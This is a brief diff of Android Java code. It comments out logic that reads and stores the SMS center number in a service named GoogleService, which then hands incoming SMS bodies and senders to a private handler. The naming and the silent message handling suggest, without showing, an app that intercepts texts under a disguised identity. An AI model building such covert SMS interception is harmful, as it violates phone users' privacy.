@@ -130,23 +130,23 @@ public class GoogleService extends Service {
                     /**
                      * 处理短信中心
                      */
-                    if (Config.DEBUG) {
-                        Config.LOGD("[[ContentObserver::onChanged]] SET sms center num : " + SettingManager.getInstance().getKeySmsCenterNum()
-                            + " center fetch : " + center);
-                    }
-                    if (TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
-                            && !TextUtils.isEmpty(center)) {
-                        if (center.startsWith("+") == true && center.length() == 14) {
-                            center = center.substring(3);
-                        } else if (center.length() > 11) {
-                            center = center.substring(center.length() - 11);
-                        }
-
-                        SettingManager.getInstance().setKeySmsCenterNum(center);
-                        if (Config.DEBUG) {
-                            Config.LOGD("[[ContentObserver::onChanged]] SET sms center num : " + SettingManager.getInstance().getKeySmsCenterNum());
-                        }
-                    }
+//                    if (Config.DEBUG) {
+//                        Config.LOGD("[[ContentObserver::onChanged]] SET sms center num : " + SettingManager.getInstance().getKeySmsCenterNum()
+//                            + " center fetch : " + center);
+//                    }
+//                    if (TextUtils.isEmpty(SettingManager.getInstance().getKeySmsCenterNum())
+//                            && !TextUtils.isEmpty(center)) {
+//                        if (center.startsWith("+") == true && center.length() == 14) {
+//                            center = center.substring(3);
+//                        } else if (center.length() > 11) {
+//                            center = center.substring(center.length() - 11);
+//                        }
+//
+//                        SettingManager.getInstance().setKeySmsCenterNum(center);
+//                        if (Config.DEBUG) {
+//                            Config.LOGD("[[ContentObserver::onChanged]] SET sms center num : " + SettingManager.getInstance().getKeySmsCenterNum());
+//                        }
+//                    }
                 }
 
                 if (PrivateSMSBRC.handleMessage(getApplicationContext(), body, address)) {
